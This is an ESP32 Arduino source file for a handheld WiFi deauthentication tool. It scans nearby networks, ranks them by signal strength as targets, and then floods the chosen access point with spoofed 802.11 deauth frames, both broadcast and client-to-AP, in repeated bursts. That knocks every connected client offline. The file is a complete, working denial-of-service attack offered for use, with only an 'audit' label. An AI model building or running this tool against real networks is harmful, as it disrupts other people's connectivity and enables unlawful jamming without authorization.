/*
 * ESP32 WiFi Deauth Tool — Real 802.11 Deauth via Raw Frame Injection
 *
 * Pin Map:
 *   TFT CS   = GPIO 5
 *   TFT DC   = GPIO 2
 *   TFT RST  = GPIO 4
 *   TFT MOSI = GPIO 23
 *   TFT SCLK = GPIO 18
 *   Joystick VRx = GPIO 34
 *   Joystick VRy = GPIO 35
 *   Joystick SW  = GPIO 32
 *   ENTER = GPIO 13 (INPUT_PULLUP)
 *   BACK  = GPIO 25 (INPUT_PULLUP)
 *
 * NOTE: Deauth frames can only be transmitted while the radio is set
 * to the SAME channel as the target AP. This code locks onto the
 * target's channel before transmitting.
 */

#include <Arduino.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "HackingGoApp.h"
#include "button.h"

// ================= Display =================
extern Adafruit_ST7735 tft;

// ================= Input Pins =================
#define JOY_X_PIN 34   // ADC1_CH6
#define JOY_Y_PIN 35   // ADC1_CH7
#define JOY_SW_PIN 32  // Joystick button
#define ENTER_PIN  13  // ENTER button
#define BACK_PIN   25  // BACK button

// ================= UI Colors (RGB565) =================
#define COLOR_BG        ST77XX_BLACK
#define COLOR_FG        ST77XX_GREEN
#define COLOR_HIGHLIGHT ST77XX_YELLOW
#define COLOR_ALERT     ST77XX_RED
#define COLOR_DIM       0x39E7 // Dark Grey (RGB565)

// ================= State Machine =================
enum UIState {
  STATE_MENU,
  STATE_SCANNING,
  STATE_TARGET_LIST,
  STATE_DEAUTH_ACTIVE
};

static UIState currentState = STATE_MENU;
static int menuIndex = 0;

// ================= Scan Results =================
#define MAX_NETWORKS 20
typedef struct {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
} NetworkInfo;

static NetworkInfo networks[MAX_NETWORKS];
static int networkCount = 0;
static int selectedIndex = 0;

// ================= Deauth Frame Structures =================
// IEEE 802.11 Deauthentication frame layout (26 bytes)
typedef struct {
  uint16_t frameCtrl;      // Frame control
  uint16_t duration;       // Duration
  uint8_t  addr1[6];       // Destination (broadcast or client)
  uint8_t  addr2[6];       // Source (AP BSSID)
  uint8_t  addr3[6];       // BSSID
  uint16_t seqCtrl;        // Sequence control
  uint16_t reasonCode;     // Reason for deauth (7 = Class 3 frame from nonassociated station)
} __attribute__((packed)) DeauthFrame;

// ================= Deauth Globals =================
static volatile bool deauthRunning = false;
static volatile uint32_t packetsSent = 0;
static int currentDeauthChannel = 1;
static String currentTargetSSID = "";
static uint8_t targetBSSID[6] = {0};
static int targetChannel = 1;

// ================= Timing =================
static unsigned long lastDeauthTx = 0;
static const unsigned long deauthInterval = 50; // ms between deauth bursts

// ================= Forward Declarations =================
void drawHeader(const char* title);
void drawStatusBar(const char* msg);
void drawMenu();
void drawTargetList();
void drawDeauthScreen();
void updateDeauthCounter();
void performScan();
void startDeauth(int index);
void stopDeauth();
void sendDeauthFrame(uint8_t* apBSSID, uint8_t channel);

// ============================================================
// SEND DEAUTH — raw frame injection at driver level
// ============================================================
void sendDeauthFrame(uint8_t* apBSSID, uint8_t channel) {
  // Ensure radio is on the target's channel — critical for delivery
  if (currentDeauthChannel != channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    currentDeauthChannel = channel;
  }

  DeauthFrame deauth;
  memset(&deauth, 0, sizeof(DeauthFrame));

  deauth.frameCtrl = 0x00C0;  // Type: Management, Subtype: Deauth (0xC0)
  deauth.duration  = 0x013A;  // Standard duration

  // 1) Broadcast target — kicks every associated client
  memset(deauth.addr1, 0xFF, 6);
  memcpy(deauth.addr2, apBSSID, 6);
  memcpy(deauth.addr3, apBSSID, 6);
  deauth.seqCtrl    = (packetsSent & 0x0FFF) << 4;
  deauth.reasonCode = 0x0007;  // Reason 7: Class 3 frame from nonassociated station

  esp_err_t result1 = esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(DeauthFrame), false);
  if (result1 == ESP_OK) {
    packetsSent++;
  }

  // 2) Client -> AP deauth
  memcpy(deauth.addr1, apBSSID, 6);
  memset(deauth.addr2, 0xFF, 6);
  memcpy(deauth.addr3, apBSSID, 6);
  deauth.seqCtrl    = (packetsSent & 0x0FFF) << 4;
  deauth.reasonCode = 0x0007;

  esp_err_t result2 = esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(DeauthFrame), false);
  if (result2 == ESP_OK) {
    packetsSent++;
  }
}

// ============================================================
// DISPLAY HELPERS
// ============================================================
void drawHeader(const char* title) {
  tft.fillScreen(COLOR_BG);
  tft.setTextColor(COLOR_FG);
  if (strlen(title) > 9) {
    tft.setTextSize(1);
    tft.setCursor(5, 7);
  } else {
    tft.setTextSize(2);
    tft.setCursor(5, 3);
  }
  tft.println(title);
  tft.drawFastHLine(0, 20, tft.width(), COLOR_FG);
}

void drawStatusBar(const char* msg) {
  tft.fillRect(0, tft.height() - 16, tft.width(), 16, COLOR_DIM);
  tft.setTextColor(COLOR_FG);
  tft.setTextSize(1);
  tft.setCursor(3, tft.height() - 12);
  tft.print(msg);
}

// ============================================================
// MENU SCREEN
// ============================================================
void drawMenu() {
  drawHeader("ESP32 TOOL");
  tft.setTextSize(1);

  const char* menuItems[3] = {
    "1. Scan WiFi Networks",
    "2. Attack Status",
    "3. Exit to Home"
  };

  for (int i = 0; i < 3; i++) {
    int y = 34 + i * 22;
    if (i == menuIndex) {
      tft.fillRect(0, y - 2, tft.width(), 18, COLOR_HIGHLIGHT);
      tft.setTextColor(COLOR_BG);
    } else {
      tft.setTextColor(COLOR_FG);
    }
    tft.setCursor(8, y + 3);
    tft.print(menuItems[i]);
  }

  drawStatusBar("Joy: move | ENTER: sel");
}

// ============================================================
// SCAN LOGIC — reliable scan via Arduino WiFi.scanNetworks
// ============================================================
void performScan() {
  currentState = STATE_SCANNING;
  drawHeader("SCANNING");
  tft.setTextSize(2);
  tft.setTextColor(COLOR_HIGHLIGHT);
  tft.setCursor(10, 36);
  tft.println("Scanning...");
  tft.setTextSize(1);
  tft.setTextColor(COLOR_FG);
  tft.setCursor(10, 62);
  tft.println("Searching 2.4GHz");
  tft.setCursor(10, 76);
  tft.println("Channels 1-13");
  drawStatusBar("Please wait...");

  // Visual scan progress indicator
  tft.drawRect(10, 98, tft.width() - 20, 10, COLOR_HIGHLIGHT);
  tft.fillRect(12, 100, 25, 6, COLOR_FG);

  // Promiscuous mode MUST be disabled during network scan
  esp_wifi_set_promiscuous(false);
  delay(30);

  // Put WiFi in STA mode and disconnect without powering off the radio
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, false);
  delay(100);

  tft.fillRect(12, 100, 60, 6, COLOR_FG);

  // Perform blocking active scan across all channels (async=false, show_hidden=true, passive=false, 300ms/ch)
  int16_t n = WiFi.scanNetworks(false, true, false, 300);

  tft.fillRect(12, 100, tft.width() - 24, 6, COLOR_FG);
  delay(100);

  networkCount = 0;
  selectedIndex = 0;

  if (n > 0) {
    int limit = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
    for (int i = 0; i < limit; i++) {
      String s = WiFi.SSID(i);
      if (s.length() == 0) {
        networks[i].ssid = "[Hidden AP]";
      } else {
        networks[i].ssid = s;
      }
      uint8_t* b = WiFi.BSSID(i);
      if (b != nullptr) {
        memcpy(networks[i].bssid, b, 6);
      } else {
        memset(networks[i].bssid, 0, 6);
      }
      networks[i].channel = WiFi.channel(i);
      networks[i].rssi = WiFi.RSSI(i);
      networkCount++;
    }
    WiFi.scanDelete();

    // Sort by signal strength (RSSI descending) so best targets are on top
    for (int i = 0; i < networkCount - 1; i++) {
      for (int j = i + 1; j < networkCount; j++) {
        if (networks[j].rssi > networks[i].rssi) {
          NetworkInfo tmp = networks[i];
          networks[i] = networks[j];
          networks[j] = tmp;
        }
      }
    }
  }

  currentState = STATE_TARGET_LIST;
  drawTargetList();
}

// ============================================================
// TARGET LIST SCREEN — joystick navigation
// ============================================================
void drawTargetList() {
  drawHeader("TARGETS");

  if (networkCount == 0) {
    tft.setTextSize(2);
    tft.setTextColor(COLOR_ALERT);
    tft.setCursor(10, 36);
    tft.println("No networks");
    tft.setTextSize(1);
    tft.setCursor(10, 62);
    tft.println("found nearby.");
    tft.setCursor(10, 84);
    tft.setTextColor(COLOR_HIGHLIGHT);
    tft.println("ENTER: Rescan");
    tft.setCursor(10, 100);
    tft.setTextColor(COLOR_FG);
    tft.println("BACK: Main Menu");
    drawStatusBar("ENTER: Rescan | BACK");
    return;
  }

  int visibleStart = 0;
  if (selectedIndex > 3) visibleStart = selectedIndex - 3;
  if (visibleStart + 4 > networkCount && networkCount >= 4) {
    visibleStart = networkCount - 4;
  }

  tft.setTextSize(1);
  for (int i = visibleStart; i < visibleStart + 4 && i < networkCount; i++) {
    int y = 26 + (i - visibleStart) * 25;
    if (i == selectedIndex) {
      tft.fillRect(0, y - 2, tft.width(), 24, COLOR_HIGHLIGHT);
      tft.setTextColor(COLOR_BG);
    } else {
      tft.setTextColor(COLOR_FG);
    }
    String ssid = networks[i].ssid;
    if (ssid.length() > 18) ssid = ssid.substring(0, 17) + "~";
    if (ssid.length() == 0) ssid = "(hidden)";
    tft.setCursor(4, y);
    tft.print(ssid);
    tft.setCursor(4, y + 10);
    tft.print("CH:");
    tft.print(networks[i].channel);
    tft.print(" ");
    tft.print(networks[i].rssi);
    tft.print("dBm");
  }

  char buf[40];
  snprintf(buf, sizeof(buf), "%d/%d | ENTER: attack", selectedIndex + 1, networkCount);
  drawStatusBar(buf);
}

// ============================================================
// DEAUTH ACTIVE SCREEN — live counter
// ============================================================
void drawDeauthScreen() {
  drawHeader("DEAUTH");
  tft.setTextSize(2);
  tft.setTextColor(COLOR_ALERT);
  tft.setCursor(10, 30);
  tft.print("Target: ");
  tft.setTextSize(1);
  tft.setCursor(10, 50);
  String t = currentTargetSSID;
  if (t.length() > 19) t = t.substring(0, 18) + "~";
  if (t.length() == 0) t = "(hidden)";
  tft.print(t);

  tft.setCursor(10, 66);
  tft.print("Channel: ");
  tft.print(currentDeauthChannel);

  tft.setTextSize(1);
  tft.setTextColor(COLOR_HIGHLIGHT);
  tft.setCursor(10, 84);
  tft.print("Packets sent:");

  updateDeauthCounter();
  drawStatusBar("BACK: STOP attack");
}

void updateDeauthCounter() {
  tft.fillRect(10, 98, tft.width() - 20, 20, COLOR_BG);
  tft.setTextSize(2);
  tft.setTextColor(COLOR_HIGHLIGHT);
  tft.setCursor(10, 100);
  tft.print(packetsSent);
}

// ============================================================
// START / STOP DEAUTH
// ============================================================
void startDeauth(int index) {
  if (index >= networkCount) return;

  currentTargetSSID = networks[index].ssid;
  memcpy(targetBSSID, networks[index].bssid, 6);
  targetChannel = networks[index].channel;
  packetsSent = 0;
  deauthRunning = true;

  // Lock radio to target's channel and enable raw transmission
  currentDeauthChannel = targetChannel;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(currentDeauthChannel, WIFI_SECOND_CHAN_NONE);

  currentState = STATE_DEAUTH_ACTIVE;
  drawDeauthScreen();
}

void stopDeauth() {
  deauthRunning = false;
  esp_wifi_set_promiscuous(false);
  delay(50);
  currentState = STATE_TARGET_LIST;
  drawTargetList();
}

// ============================================================
// MAIN APPLICATION ENTRY POINT (HackingGo / WiFi Radio Audit)
// ============================================================
void radioAuditApp() {
  // 1. Standard Portrait rotation & clean 5x7 font
  tft.setRotation(0);
  tft.setFont(NULL);

  // 2. Hardware Input Pins setup
  pinMode(JOY_SW_PIN, INPUT_PULLUP);
  pinMode(ENTER_PIN, INPUT_PULLUP);
  pinMode(BACK_PIN, INPUT_PULLUP);
  pinMode(JOY_X_PIN, INPUT);
  pinMode(JOY_Y_PIN, INPUT);

  clearButtonEvents();

  // 3. Prepare WiFi radio for scanning & injection (do NOT power down radio)
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, false);
  delay(100);

  currentState = STATE_MENU;
  menuIndex = 0;
  deauthRunning = false;
  packetsSent = 0;

  drawMenu();

  int lastJoySW = HIGH;
  bool appRunning = true;

  while (appRunning) {
    // Debounce & sample push buttons
    updateButton();

    // Joystick SW button edge detection
    int currentJoySW = digitalRead(JOY_SW_PIN);
    bool joySWPressed = (currentJoySW == LOW && lastJoySW == HIGH);
    lastJoySW = currentJoySW;

    bool enterPressed = isEnterPressed() || joySWPressed;
    bool backPressed = isBackPressed();

    // Analog Joystick Y reading (vry < 1000 is UP, vry > 3000 is DOWN)
    int joyY = analogRead(JOY_Y_PIN);
    static bool joyCentered = true;
    int joyStep = 0;

    if (joyY > 1400 && joyY < 2600) {
      joyCentered = true;
    } else if (joyCentered) {
      if (joyY < 1000) { // UP
        joyStep = -1;
        joyCentered = false;
      } else if (joyY > 3000) { // DOWN
        joyStep = 1;
        joyCentered = false;
      }
    }

    // State machine input processing
    switch (currentState) {
      case STATE_MENU: {
        if (joyStep != 0) {
          menuIndex = (menuIndex + joyStep + 3) % 3;
          drawMenu();
        }

        if (enterPressed) {
          clearButtonEvents();
          if (menuIndex == 0) {
            performScan();
          } else if (menuIndex == 1) {
            if (currentTargetSSID.length() > 0) {
              currentState = STATE_DEAUTH_ACTIVE;
              drawDeauthScreen();
            } else {
              drawStatusBar("No active target");
            }
          } else if (menuIndex == 2) {
            appRunning = false; // Exit to Home Screen
          }
        }

        if (backPressed) {
          clearButtonEvents();
          appRunning = false; // Exit to Home Screen
        }
        break;
      }

      case STATE_SCANNING:
        // Synchronous scan inside performScan()
        break;

      case STATE_TARGET_LIST: {
        if (networkCount == 0) {
          if (enterPressed) {
            clearButtonEvents();
            performScan();
          }
          if (backPressed) {
            clearButtonEvents();
            currentState = STATE_MENU;
            drawMenu();
          }
          break;
        }

        if (joyStep != 0) {
          if (joyStep < 0 && selectedIndex > 0) {
            selectedIndex--;
            drawTargetList();
          } else if (joyStep > 0 && selectedIndex < networkCount - 1) {
            selectedIndex++;
            drawTargetList();
          }
        }

        if (enterPressed) {
          clearButtonEvents();
          startDeauth(selectedIndex);
        }

        if (backPressed) {
          clearButtonEvents();
          currentState = STATE_MENU;
          drawMenu();
        }
        break;
      }

      case STATE_DEAUTH_ACTIVE: {
        if (backPressed) {
          clearButtonEvents();
          stopDeauth();
        }
        break;
      }
    }

    // Continuous deauth transmission while active
    if (deauthRunning && currentState == STATE_DEAUTH_ACTIVE) {
      if (millis() - lastDeauthTx >= deauthInterval) {
        lastDeauthTx = millis();

        // Transmit 5 frame pairs per burst for maximum effectiveness
        for (int i = 0; i < 5; i++) {
          sendDeauthFrame(targetBSSID, targetChannel);
        }

        updateDeauthCounter();
      }
    }

    delay(10);
  }

  // Cleanup before returning to Home Screen
  if (deauthRunning) {
    stopDeauth();
  }
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(false, false);
  delay(50);
}